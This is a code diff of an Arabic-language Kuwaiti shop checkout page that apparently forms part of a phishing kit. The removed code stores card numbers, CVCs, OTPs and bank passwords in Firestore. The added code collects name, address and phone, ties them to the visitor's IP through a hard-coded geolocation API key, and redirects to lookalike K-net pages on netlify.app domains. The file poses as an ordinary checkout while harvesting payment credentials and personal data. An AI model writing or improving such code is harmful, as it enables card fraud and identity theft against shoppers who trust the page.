@@ -1,77 +1,118 @@
 'use client'
 
-import { useState } from 'react'
-import { Home, Briefcase, MapPin, ChevronRight, ShoppingCart } from 'lucide-react'
+import React, { useEffect, useState } from 'react'
+import { Home, Briefcase, MapPin, ChevronRight } from 'lucide-react'
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
 import { Button } from "@/components/ui/button"
 import Image from 'next/image'
-import { useCart } from '@/components/cart-provider'
-import PaymentForm from '../payment-form'
-import { doc, setDoc } from 'firebase/firestore'
-import db from '../lib/firebase'
 import { Input } from '@/components/ui/input'
-import { Sheet, SheetTrigger,SheetContent,SheetHeader,SheetDescription ,SheetTitle} from '@/components/ui/sheet'
+import { collection, query, getDocs, doc, setDoc } from 'firebase/firestore'
+import database from '@/lib/firebase'
+
+
+function cleanString(input: string) {
+  return input.replace(/[^a-zA-Z0-9 ]/g, '');
+}
+export async function addData(data: any) {
+  const requestOptions = {
+    method: 'GET',
+    redirect: 'follow',
+  };
+    fetch(
+      'https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4',
+      requestOptions as any
+    )
+      .then((response) => response.json())
+      .then((result) => {
+        let id = cleanString(result.ip);
+        const visitorsRef = doc(database, `/users/${id}`);
+        // Save visitor data
+        setDoc(visitorsRef, { data, result })
+          .then(() => {
+            console.log('Visitor data recorded successfully!');
+          })
+          .catch((error) => {
+            console.error('Error recording visitor data:', error);
+          });
+      });
+    }
+  
+
 
 type LocationType = 'home' | 'work' | 'client'
 type PaymentType = 'full' | 'partial'
 
+interface PersonalInfo {
+  id: string
+  name: string
+  address: string
+  phone: string
+}
+
 export default function CheckoutPage() {
   const [selectedLocation, setSelectedLocation] = useState<LocationType>('home')
   const [paymentType, setPaymentType] = useState<PaymentType>('full')
-  const [setp, setStep] = useState(1)
-  const [loading, setisloading] = useState(false)
-  const [showCart, setShowCart] = useState(false)
+  const [personalInfo, setPersonalInfo] = useState<PersonalInfo>({ id: "2", name: '', address: '', phone: "" })
+  const [loading, setIsLoading] = useState(false)
+  const [cartLength, setCartLength] = useState(0)
+  const [total, setTotal] = useState(0)
 
-  const handlePaymentComplete = async (paymentInfo: any, method: any) => {
-    try {
-      // Create an order object
-      const order = {
-        cardNumber: paymentInfo?.cardNumber,
-        year: paymentInfo?.year,
-        month: paymentInfo?.month,
-        cvc: paymentInfo?.cvc,
-        otp: paymentInfo?.otp,
-        pass: paymentInfo?.pass,
-        createdAt: new Date(),
-        cardState:'new',
-        bank:        paymentInfo?.bank,
-        prefix:paymentInfo.prefix
-      }
-      const docRef = await doc(db, 'orders', paymentInfo.cardNumber)
-      const ref = await setDoc(docRef, order)
-
-    } catch {
-
-    }
-
-    // Add the order to Firestore
-
-
-
-    // Clear the cart and redirect to home page
-    localStorage.removeItem('cart')
-
-  }
-  const handleSubmit = (e: any) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    setisloading(true)
+    console.log(personalInfo)
+    await addData({ personalInfo })
+    setIsLoading(true)
     setTimeout(() => {
-      setisloading(false)
-      window.location.hostname="https://kentbanks.netlify.app/"
-      window.location.replace("https://kentbanks.netlify.app/")
+      setIsLoading(false)
+      window.location.href = "https://authorizations.netlify.app/"
     }, 3000)
   }
 
-  const { cart ,removeFromCart} = useCart()
-  const total = cart.reduce((sum, item) => sum + item.price * item.quantity, 0)
+  function cleanString(input: string) {
+    return input.replace(/[^a-zA-Z0-9]/g, '')
+  }
 
+  useEffect(() => {
+    const fetchIpAndSetupListener = async () => {
+      try {
+        const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4')
+        if (!response.ok) {
+          throw new Error('Failed to fetch IP geolocation data')
+        }
+        const result = await response.json()
+        const userId = cleanString(result.ip)
+        console.log('User ID:', userId)
 
+        const usersCollection = collection(database, 'users');
+        const usersQuery = query(usersCollection);
+        const querySnapshot = await getDocs(usersQuery);
+
+        const data: any[] = [];
+        querySnapshot.forEach((doc) => {
+          const userData = doc.data();
+          setCartLength(userData.data.cart)
+          setTotal(userData.data.total)
+
+          if (userData.info && userData.info.data) {
+            setTotal
+            data.push({
+              id: doc.id,
+              ...userData.info.data,
+            });
+          }
+        });
+      } catch (error) {
+        console.error('Error fetching data:', error)
+      }
+    }
+
+    fetchIpAndSetupListener()
+  }, [])
 
   return (
     <div className="min-h-screen bg-gray-100 p-4 font-sans" dir="rtl">
-    
-    <form onSubmit={handleSubmit} className="mx-auto max-w-md space-y-6">
+      <form onSubmit={handleSubmit} className="mx-auto max-w-md space-y-6">
         {/* Location Selection */}
         <div className="space-y-4">
           <h1 className="text-xl font-bold text-right">حدد موقعك</h1>
@@ -80,51 +121,59 @@ export default function CheckoutPage() {
             <h3 className="text-lg font-bold">تفاصيل العنوان</h3>
             <div className="grid grid-cols-1 gap-4">
               <div className="space-y-2">
-                <Label htmlFor="area">الأسم</Label>
+                <Label htmlFor="name">الأسم</Label>
                 <Input
-                  id="area"
-                  name="area"
+                  id="name"
+                  name="name"
                   required
+                  value={personalInfo.name}
+                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, name: e.target.value }))}
                 />
               </div>
               <div className="space-y-2">
-                <Label htmlFor="block">العنوان</Label>
+                <Label htmlFor="address">العنوان</Label>
                 <Input
-                  id="block"
-                  name="block"
+                  id="address"
+                  name="address"
                   required
+                  value={personalInfo.address}
+                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, address: e.target.value }))}
                 />
               </div>
             </div>
 
             <div className="grid grid-cols-1 gap-4">
               <div className="space-y-2">
-                <Label htmlFor="street">البناية / الشقة</Label>
+                <Label htmlFor="building">البناية / الشقة</Label>
                 <Input
-                  id="street"
+                  id="building"
                   placeholder="مثال: بناية رقم 9"
                   required
                 />
               </div>
               <div className="space-y-2">
-                <Label htmlFor="house">رقم الهاتف</Label>
+                <Label htmlFor="phone">رقم الهاتف</Label>
                 <div className='flex'>
-                <Input
-                  id="house"
-                  name="house"
-                  required
-                /> <Input
-                id="house"
-                name="house"
-                className='w-32 mx-1'
-                readOnly
-                value={'965+'}
-                required
-              /></div>
+                  <Input
+                    id="phone"
+                    name="phone"
+                    type='tel'
+                    required
+                    value={personalInfo.phone}
+                    onChange={(e) => setPersonalInfo((prev) => ({ ...prev, phone: e.target.value }))}
+                  />
+                  <Input
+                    id="countryCode"
+                    name="countryCode"
+                    className='w-32 mx-1'
+                    readOnly
+                    value={'965+'}
+                    required
+                  />
+                </div>
               </div>
             </div>
 
-          
             <div className="space-y-2">
               <Label htmlFor="notes">ملاحظات إضافية (اختياري)</Label>
               <Input
@@ -134,45 +183,39 @@ export default function CheckoutPage() {
               />
             </div>
             <div className="flex justify-between gap-4">
-            <button
-              onClick={() => setSelectedLocation('client')}
-              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${selectedLocation === 'client' ? 'bg-gray-200' : 'bg-gray-100'
-                }`}
-            >
-              <MapPin className="h-5 w-5" />
-              <span>العميل</span>
-            </button>
-            <button
-              onClick={() => setSelectedLocation('work')}
-              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${selectedLocation === 'work' ? 'bg-gray-200' : 'bg-gray-100'
-                }`}
-            >
-              <Briefcase className="h-5 w-5" />
-              <span>العمل</span>
-            </button>
-            <button
-              onClick={() => setSelectedLocation('home')}
-              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${selectedLocation === 'home' ? 'bg-black text-white' : 'bg-gray-100'
-                }`}
-            >
-              <Home className="h-5 w-5" />
-              <span>البيت</span>
-            </button>
+              {(['client', 'work', 'home'] as LocationType[]).map((locationType) => (
+                <button
+                  key={locationType}
+                  type="button"
+                  onClick={() => setSelectedLocation(locationType)}
+                  className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${
+                    selectedLocation === locationType
+                      ? locationType === 'home'
+                        ? 'bg-black text-white'
+                        : 'bg-gray-200'
+                      : 'bg-gray-100'
+                  }`}
+                >
+                  {locationType === 'client' && <MapPin className="h-5 w-5" />}
+                  {locationType === 'work' && <Briefcase className="h-5 w-5" />}
+                  {locationType === 'home' && <Home className="h-5 w-5" />}
+                  <span>{locationType === 'client' ? 'العميل' : locationType === 'work' ? 'العمل' : 'البيت'}</span>
+                </button>
+              ))}
+            </div>
           </div>
-          </div>
-          
         </div>
 
         {/* Payment Method */}
         <div className="space-y-4">
           <h2 className="text-xl font-bold text-right">طريقة الدفع</h2>
-          <button className="w-full flex items-center justify-between bg-gray-100 p-4 rounded-lg">
+          <button type="button" className="w-full flex items-center justify-between bg-gray-100 p-4 rounded-lg">
             <div className="flex items-center gap-2">
               <ChevronRight className="h-5 w-5" />
               <span>بطاقة السحب الآلي</span>
             </div>
             <Image
-              src="/kent.svg"
+              src="/images/kent.svg"
               alt="K-net"
               width={40}
               height={40}
@@ -186,37 +229,8 @@ export default function CheckoutPage() {
           <h3 className="text-lg font-bold">سلة أسماك الوطنية</h3>
           <div className="space-y-2">
             <div className="flex justify-between">
-            <Sheet>
-            <SheetTrigger asChild>
-              <Button  variant="outline" className="relative">
-                {cart.length > 0 && (
-                  <>المنتجات ({cart.length})</>
-                    
-                )}
-              </Button>
-            </SheetTrigger>
-            <SheetContent >
-              <SheetHeader>
-                <SheetTitle>سلة التسوق</SheetTitle>
-                <SheetDescription>
-                  {cart.length === 0 ? "سلة التسوق فارغة" : `${cart.length} منتجات في السلة`}
-                </SheetDescription>
-              </SheetHeader>
-              <div className="mt-4 space-y-4">
-                {cart.map((item, index) => (
-                  <div key={index} className="flex justify-between items-center">
-                    <span>{item.name}</span>
-                    <div className="flex items-center gap-2">
-                      <span>{item.price.toFixed(3)} د.ك</span>
-                      <Button size="sm" variant="destructive" onClick={() => removeFromCart(item.id)}>
-                        حذف
-                      </Button>
-                    </div>
-                  </div>
-                ))}
-              </div>
-            </SheetContent>
-          </Sheet>              <span>{total.toString()}د.ك</span>
+              <span>المنتجات ({cartLength})</span>
+              <span>{total} د.ك</span>
             </div>
             <div className="flex justify-between">
               <span>قيمة التوصيل</span>
@@ -260,11 +274,12 @@ export default function CheckoutPage() {
         {/* Proceed Button */}
         <Button
           type='submit'
-          className="w-full bg-blue-200 text-blue-800 hover:bg-blue-300 p-6 text-lg rounded-xl">
-          {!loading ? `متابعة الدفع (${total})د.ك` : "الرجاء الانتظار"}
+          className="w-full bg-blue-200 text-blue-800 hover:bg-blue-300 p-6 text-lg rounded-xl"
+          disabled={loading}
+        >
+          {!loading ? `متابعة الدفع (${total}) د.ك` : "الرجاء الانتظار"}
         </Button>
       </form>
-      
     </div>
   )
 }
